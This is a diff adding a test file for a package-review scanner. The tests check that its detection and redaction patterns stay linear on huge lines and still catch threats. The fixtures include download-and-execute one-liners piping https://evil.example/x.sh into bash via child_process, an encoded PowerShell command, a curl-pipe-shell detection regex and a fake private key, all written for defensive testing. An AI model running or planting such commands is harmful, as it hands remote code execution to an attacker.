@@ -1,0 +1,199 @@
+import { describe, expect, it } from "vitest";
+import { deterministicFindings, type FileRecord } from "../server/lib/review";
+import { redactFileRecords, redactText } from "../server/lib/review/redaction";
+import {
+  firstMatchingCodeLine,
+  firstMatchingLine,
+  firstMatchingSourceLine,
+  matchesAnyPattern,
+} from "../server/lib/platform/text-utils";
+
+/**
+ * Cost guard for the deterministic scanner.
+ *
+ * Package bodies are unbounded evidence and a minified bundle is a single
+ * multi-megabyte line, so a pattern that is superlinear in the length of the
+ * string it is handed is a CPU-exhaustion primitive against the parent Worker —
+ * reachable anonymously through /diff by publishing a package. Two real ones
+ * shipped (the `curl … | sh` download-execute pair, and the PEM private-key
+ * redaction pattern). `platform/text-utils.ts` bounds deterministic matchers to
+ * sliding windows, while the full-body redaction patterns stay linear.
+ *
+ * These budgets are deliberately loose — they are catching "quadratic", not
+ * "slow" — so they stay stable on a loaded CI box.
+ */
+
+// Shapes that expose greedy/lazy rescanning, each as ONE line (the minified
+// bundle case). If any pattern is superlinear in line length, the 512 KB
+// variant blows the budget by orders of magnitude.
+const PAYLOADS: Array<[string, (bytes: number) => string]> = [
+  ["pipes-after-curl", (n) => "curl " + "|".repeat(n)],
+  ["pipes-after-wget", (n) => "wget " + "|".repeat(n)],
+  ["pipes-after-iwr", (n) => "iwr " + "|".repeat(n)],
+  ["curl-then-slashes", (n) => "curl x |" + "/".repeat(n)],
+  ["curl-then-words", (n) => "curl x |" + "env ".repeat(n / 4)],
+  ["nc-dashes", (n) => "nc " + " -".repeat(n / 2)],
+  ["powershell-dashes", (n) => "powershell " + " -".repeat(n / 2)],
+  ["unclosed-block-comments", (n) => "/*a".repeat(n / 3) + "*/"],
+  ["open-block-comments", (n) => "/*".repeat(n / 2)],
+  ["begin-private-key", (n) => "-----BEGIN PRIVATE KEY-----".repeat(n / 27)],
+  ["begin-rsa-key", (n) => "-----BEGIN RSA PRIVATE KEY-----".repeat(n / 31)],
+  ["secret-assignments", (n) => "secret=".repeat(n / 14) + "a".repeat(n / 2)],
+  ["scheme-credentials", (n) => "http://user:".repeat(n / 12)],
+  ["bearer-headers", (n) => "authorization=Bearer ".repeat(n / 21)],
+  ["env-access", (n) => "process.env.CI".repeat(n / 14)],
+  ["gyp-node-command", (n) => "<!(" + "node ".repeat(n / 5)],
+  ["obfuscated-table", (n) => "_0xdeadbeef".repeat(n / 11)],
+];
+
+const SMALL_BYTES = 32 * 1024;
+const LARGE_BYTES = 512 * 1024;
+// 16x the input for at most this much more time. A quadratic pattern needs
+// ~256x; a linear one needs ~16x.
+const MAX_GROWTH_FACTOR = 48;
+// Floor so that sub-millisecond timings cannot manufacture a huge ratio.
+const NOISE_FLOOR_MS = 15;
+
+function scanFile(body: string): void {
+  const files: FileRecord[] = [
+    file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
+    file("index.js", body),
+  ];
+  deterministicFindings(
+    files,
+    [],
+    { name: "probe", version: "1.0.0" },
+    {
+      entrypointResolution: "npm",
+    },
+  );
+  redactFileRecords(files);
+}
+
+function file(path: string, textSample: string): FileRecord {
+  return { path, size: textSample.length, sha256: "0".repeat(64), textSample, flags: [] };
+}
+
+function elapsedMs(run: () => void): number {
+  const started = performance.now();
+  run();
+  return performance.now() - started;
+}
+
+describe("deterministic scan cost", () => {
+  it("matches directly across a bounded scan-window seam", () => {
+    const source = `${"a".repeat(8 * 1024 - 4)}needle`;
+    const pattern = /needle/g;
+    expect(matchesAnyPattern(source, [pattern])).toBe(true);
+    expect(matchesAnyPattern(source, [pattern])).toBe(true);
+    expect(matchesAnyPattern(source, [/absent/])).toBe(false);
+  });
+
+  it.each(PAYLOADS)(
+    "stays linear in line length: %s",
+    (_name, make) => {
+      const small = Math.max(
+        elapsedMs(() => scanFile(make(SMALL_BYTES))),
+        NOISE_FLOOR_MS,
+      );
+      const large = elapsedMs(() => scanFile(make(LARGE_BYTES)));
+      expect(large / small).toBeLessThan(MAX_GROWTH_FACTOR);
+    },
+    120000,
+  );
+
+  it("scans a large hostile line in bounded time", () => {
+    // Absolute budget, not a ratio: the Worker CPU limit is what this protects.
+    for (const [, make] of PAYLOADS) {
+      expect(elapsedMs(() => scanFile(make(LARGE_BYTES)))).toBeLessThan(5000);
+    }
+  }, 240000);
+
+  it("still finds a download-execute one-liner", () => {
+    const findings = deterministicFindings(
+      [
+        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
+        file(
+          "install.js",
+          "const cp = require('child_process');\ncp.execSync('curl -fsSL https://evil.example/x.sh | sudo -E /bin/bash');\n",
+        ),
+      ],
+      [],
+      { name: "probe", version: "1.0.0" },
+      { entrypointResolution: "npm" },
+    );
+    expect(findings.length).toBeGreaterThan(0);
+  });
+
+  it.each([
+    `curl -H "X-Pad: ${"a".repeat(512)}" https://evil.example/x.sh | bash`,
+    `powershell ${"-NoProfile ".repeat(48)} -EncodedCommand QUFBQQ==`,
+  ])("does not let padding hide a download-execute command", (command) => {
+    const findings = deterministicFindings(
+      [
+        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
+        file("install.js", command),
+      ],
+      [],
+      { name: "probe", version: "1.0.0" },
+      { entrypointResolution: "npm" },
+    );
+    expect(findings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ ruleId: "code.remote-shell", severity: "critical" }),
+      ]),
+    );
+  });
+
+  it("still finds a base64 decode whose prefix is in an earlier scan window", () => {
+    const source = `const code = Buffer.from("${"A".repeat(9 * 1024)}", "base64");`;
+    const findings = deterministicFindings(
+      [
+        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
+        file("payload.js", source),
+      ],
+      [],
+      { name: "probe", version: "1.0.0" },
+      { entrypointResolution: "npm" },
+    );
+    expect(findings).toEqual(
+      expect.arrayContaining([expect.objectContaining({ ruleId: "code.dynamic-evaluation" })]),
+    );
+  });
+
+  it("still redacts a PEM private key", () => {
+    const pem = [
+      "-----BEGIN RSA PRIVATE KEY-----",
+      "Proc-Type: 4,ENCRYPTED",
+      "DEK-Info: AES-256-CBC,0123456789ABCDEF",
+      "",
+      "MIIEowIBAAKCAQEA3Tz2mr7SZiAMfQyuvBjM9Oi",
+      "-----END RSA PRIVATE KEY-----",
+    ].join("\n");
+    expect(redactText(`key = ${pem}`)).toContain("[REDACTED_PRIVATE_KEY]");
+    expect(redactText(`key = ${pem}`)).not.toContain("MIIEowIBAAKCAQEA");
+  });
+
+  it("redacts an armored private key larger than 20 KB", () => {
+    const body = "A".repeat(24 * 1024);
+    const pem =
+      `-----BEGIN PGP PRIVATE KEY-----\nComment: generated ---- offline\n\n${body}\n` +
+      "-----END PGP PRIVATE KEY-----";
+    const redacted = redactText(`key = ${pem}`);
+    expect(redacted).toContain("[REDACTED_PRIVATE_KEY]");
+    expect(redacted).not.toContain(body);
+  });
+
+  it("finds a match that straddles a scan-window seam", () => {
+    // The window is 8 KB with a 1 KB overlap; put the match just past the first
+    // window boundary so only the overlap can carry it.
+    // Trailing space so `\bcurl\b` has a word boundary to match against.
+    const filler = `${"a".repeat(8 * 1024 - 21)} `;
+    const line = `${filler}curl https://x | bash`;
+    expect(firstMatchingLine(line, [/\bcurl\b[^\n;&]{0,400}\|\s*(?:ba)?sh\b/])).toBe(1);
+    expect(firstMatchingCodeLine(line, [/\bcurl\b[^\n;&]{0,400}\|\s*(?:ba)?sh\b/])).toBe(1);
+    expect(firstMatchingSourceLine(`x\n${line}`, [/\bcurl\b[^\n;&]{0,400}\|\s*(?:ba)?sh\b/])).toBe(
+      2,
+    );
+  });
+});
